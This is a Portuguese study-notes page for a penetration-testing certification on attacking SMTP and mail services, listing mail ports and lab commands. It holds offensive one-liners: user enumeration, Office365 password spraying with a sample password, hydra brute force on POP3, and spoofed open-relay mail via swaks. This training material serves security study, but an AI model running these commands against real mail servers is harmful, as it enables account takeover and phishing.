> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/attacking-common-services/smtp.md).

# SMTP

Um `mail server`(às vezes também chamado de servidor de e-mail) é um servidor que manipula e entrega e-mails por uma rede, geralmente pela Internet.

* **Host - MX Records**

```sh
host -t MX hackthebox.eu
```

* **DIG - MX Records**

```sh
dig mx plaintext.do | grep "MX" | grep -v ";"
```

* **Host - A Records**

```sh
host -t A mail1.inlanefreight.htb.
```

**Portas comuns**

| **Porta** | **Serviço**                                                                     |
| --------- | ------------------------------------------------------------------------------- |
| `TCP/25`  | SMTP não criptografado                                                          |
| `TCP/143` | IMAP4 não criptografado                                                         |
| `TCP/110` | POP3 não criptografado                                                          |
| `TCP/465` | SMTP criptografado                                                              |
| `TCP/587` | SMTP criptografado/ [STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) |
| `TCP/993` | IMAP4 criptografado                                                             |
| `TCP/995` | POP3 criptografado                                                              |

* Podemos usar a opção `Nmap`de script padrão do `-sC`para enumerar essas portas no sistema de destino:

```sh
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

* Conecte-se ao servidor SMTP.

```sh
telnet 10.10.110.20 25
```

* Enumeração de usuários SMTP usando o comando RCPT em relação ao host especificado.

```sh
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

* Verifique o uso do Office365 para o domínio especificado.

```sh
python3 o365spray.py --validate --domain msplaintext.xyz
```

* Enumere usuários existentes usando o Office365 no domínio especificado.

```sh
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

* Pulverização de senhas em uma lista de usuários que usam o Office 365 para o domínio especificado.

```sh
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

* Força bruta no serviço POP3.

```sh
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

* Testando o serviço SMTP para a vulnerabilidade de retransmissão aberta.

```sh
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
```
